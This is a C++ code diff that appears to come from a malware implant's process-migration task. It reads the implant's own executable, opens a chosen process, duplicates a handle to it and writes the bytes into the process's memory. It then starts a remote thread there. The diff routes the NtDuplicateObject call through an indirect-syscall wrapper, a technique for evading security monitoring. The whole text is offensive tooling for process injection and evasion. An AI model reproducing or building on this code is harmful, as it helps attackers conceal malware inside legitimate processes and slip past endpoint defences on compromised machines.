@@ -13,7 +13,8 @@ namespace Task
     {
         DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
 
-        HANDLE hCurrProcess = GetCurrentProcess();
+        // HANDLE hCurrProcess = GetCurrentProcess();
+        HANDLE hCurrProcess = NtCurrentProcess();
 
         // Get the current process executable file name to migrate.
         WCHAR execName[MAX_PATH*4];
@@ -31,27 +32,29 @@ namespace Task
         // Read the executable file data to write process memory.
         std::vector<BYTE> bytes = System::Fs::FileRead(pState->pProcs, std::wstring(execName));
 
-        // Open target process to migrate.
-        HANDLE hTargetProcess = System::Process::ProcessOpen(
+        // Open the source process to duplicate.
+        HANDLE hSrcProcess = System::Process::ProcessOpen(
             pState->pProcs,
             dwPid,
             PROCESS_DUP_HANDLE
         );
-        if (!hTargetProcess)
+        if (!hSrcProcess)
         {
-            return L"Error: Could not open the target process.";
+            return L"Error: Failed to open the target process handle.";
         }
 
-        HANDLE hDuplProcess;
+        HANDLE hDup;
 
-        NTSTATUS status = pState->pProcs->lpNtDuplicateObject(
-            hTargetProcess,
-            &hCurrProcess,
+        NTSTATUS status = CallSysInvoke(
+            &pState->pProcs->sysNtDuplicateObject,
+            pState->pProcs->lpNtDuplicateObject,
+            hSrcProcess,
             hCurrProcess,
-            &hDuplProcess,
-            DUPLICATE_SAME_ACCESS,
-            FALSE,
-            0
+            hCurrProcess,
+            &hDup,
+            0,
+            0,
+            DUPLICATE_SAME_ACCESS
         );
         if (status != STATUS_SUCCESS)
         {
@@ -60,7 +63,7 @@ namespace Task
 
         LPVOID pRemoteAddr = System::Process::VirtualMemoryAllocate(
             pState->pProcs,
-            hDuplProcess,
+            hDup,
             bytes.size(),
             MEM_COMMIT,
             PAGE_READWRITE
@@ -69,7 +72,7 @@ namespace Task
         DWORD dwWritten;
         if (!System::Process::VirtualMemoryWrite(
             pState->pProcs,
-            hDuplProcess,
+            hDup,
             pRemoteAddr,
             bytes.data(),
             bytes.size(),
@@ -80,9 +83,9 @@ namespace Task
 
         HANDLE hThread = System::Process::RemoteThreadCreate(
             pState->pProcs,
-            hDuplProcess,
+            hDup,
             (LPTHREAD_START_ROUTINE)pRemoteAddr,
-            NULL
+            nullptr
         );
         if (!hThread)
         {
